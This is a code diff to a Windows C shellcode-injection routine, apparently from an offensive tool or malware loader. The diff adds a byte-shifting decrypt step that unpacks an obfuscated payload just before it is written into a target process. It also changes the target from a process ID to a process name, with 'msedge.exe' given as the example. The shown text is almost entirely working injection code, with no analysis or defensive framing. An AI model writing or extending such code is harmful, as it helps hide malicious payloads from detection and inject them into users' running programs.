@@ -7,7 +7,11 @@
 #include <tlhelp32.h>
 #include "../debug_print/debug_print.h"
 
-
+void custom_decrypt(unsigned char *buf, const int buf_length) {
+	for(int i = 0; i < buf_length; i++) {
+		buf[i] = buf[i] - 0xFE;
+	}	
+}
 
 int FindTarget(char* procname) { // Changed to wchar_t for Unicode
 
@@ -37,8 +41,8 @@ int FindTarget(char* procname) { // Changed to wchar_t for Unicode
     return pid;
 }
 
-// payload_info format:     pid
-// pid specifies the process ID of the process to inject the shellcode into.
+// payload_info format:     'msedge.exe'
+// specifies the process name to inject the shellcode into.
 //
 // This was successfully tested on both 32 and 64 bit systems
 void inject_shellcode_procname(unsigned char *shellcode, int shellcode_size, char *payload_info) {
@@ -73,6 +77,10 @@ void inject_shellcode_procname(unsigned char *shellcode, int shellcode_size, cha
         DEBUG_PRINT("Memory allocation failed.\n");
         return;
     }
+
+    DEBUG_PRINT("Decrypting payload\n");
+    // Decrypt payload
+    custom_decrypt(shellcode, shellcode_size);
 
     // Write shellcode into allocated target buffer
     DEBUG_PRINT("Writing shellcode into allocated target buffer...\n");    
